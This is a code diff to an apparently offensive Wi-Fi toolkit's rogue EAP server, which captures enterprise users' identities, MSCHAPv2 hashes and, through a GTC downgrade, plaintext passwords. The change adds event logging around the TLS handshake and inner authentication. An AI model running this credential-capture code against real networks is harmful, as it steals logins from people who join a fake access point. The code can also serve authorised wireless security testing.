@@ -15,7 +15,7 @@ import os
 import struct
 from dataclasses import dataclass
 from enum import Enum, auto
-from typing import Optional
+from typing import Callable, Optional
 
 from wifit3.crack.netntlm_format import mschapv2_hashline, plaintext_line
 from wifit3.dot11 import mschapv2
@@ -58,11 +58,14 @@ class Capture:
 
 class EapServer:
     def __init__(self, ssid: str, *, method: Method = Method.PEAP, gtc_downgrade: bool = False,
-                 context=None, server_name: str = "wifit3") -> None:
+                 context=None, server_name: str = "wifit3",
+                 on_event: Optional[Callable[[str], None]] = None) -> None:
         self.ssid = ssid
         self.method = method
         self.gtc_downgrade = gtc_downgrade
         self.server_name = server_name
+        self.on_event = on_event or (lambda _m: None)
+        self._announced_tls = False
         self._outer_type = EAP_TYPE_PEAP if method is Method.PEAP else EAP_TYPE_TTLS
         self._context = context or server_context()
         self._tunnel: Optional[TlsTunnel] = None
@@ -100,6 +103,7 @@ class EapServer:
 
     def _on_outer_identity(self, eap: EapMessage) -> list[bytes]:
         self.outer_identity = eap.data.decode("utf-8", errors="replace").strip("\x00")
+        self.on_event(f"identity = {self.outer_identity or '<empty>'}; starting {self.method.value} TLS")
         self._capture_identity_only()
         self._tunnel = TlsTunnel(self._context, server_side=True)
         self._state = _State.TLS
@@ -137,12 +141,19 @@ class EapServer:
             if self._tunnel.handshake_done:
                 self._await_phase2 = True           # our last flight; phase 2 begins on the next turn
                 self._state = _State.PHASE2
+                self._announce_tls()
             return self._emit_tls(out)
         if self._tunnel.handshake_done:
             self._state = _State.PHASE2
             self._await_phase2 = False
+            self._announce_tls()
             return self._begin_phase2()
         return [self._request(eap_tls_body(self._outer_type))]
+
+    def _announce_tls(self) -> None:
+        if not self._announced_tls:
+            self._announced_tls = True
+            self.on_event("TLS tunnel established (client accepted the certificate)")
 
     def _advance_phase2(self, _tls_in: bytes) -> list[bytes]:
         assert self._tunnel is not None
@@ -170,9 +181,11 @@ class EapServer:
             return self._handle_ttls_pap(plaintext)
         inner = parse_eap(plaintext)
         if inner is None:
+            self.on_event("phase 2: could not parse the inner EAP packet")
             return self._finish()
         if inner.code == EAP_RESPONSE and inner.method_type == EAP_TYPE_IDENTITY:
             self.inner_username = inner.data.decode("utf-8", errors="replace").strip("\x00")
+            self.on_event(f"inner identity = {self.inner_username or '<empty>'}")
             return self._send_inner_challenge()
         if inner.code == EAP_RESPONSE and inner.method_type == EAP_TYPE_NAK:
             return self._on_inner_nak(inner)
@@ -180,9 +193,11 @@ class EapServer:
             return self._capture_mschapv2(inner.data)
         if inner.code == EAP_RESPONSE and inner.method_type == EAP_TYPE_GTC:
             return self._capture_gtc(inner.data)
+        self.on_event(f"phase 2: unhandled inner EAP type {inner.method_type}")
         return self._finish()
 
     def _send_inner_challenge(self) -> list[bytes]:
+        self.on_event(f"offering inner {'EAP-GTC (downgrade)' if self._offered_gtc else 'MSCHAPv2'}")
         if self._offered_gtc:
             prompt = b"Password"
             return self._tunnel_send(eap_packet(EAP_REQUEST, self._bump_inner(), EAP_TYPE_GTC, prompt))
@@ -195,6 +210,7 @@ class EapServer:
         """The supplicant rejected our method and listed the ones it wants; switch to GTC or
         MSCHAPv2 if offered, else give up."""
         wanted = set(inner.data)
+        self.on_event(f"client NAK'd our method; it wants EAP type(s) {sorted(wanted)}")
         if EAP_TYPE_GTC in wanted:
             self._offered_gtc = True
         elif EAP_TYPE_MSCHAPV2 in wanted:
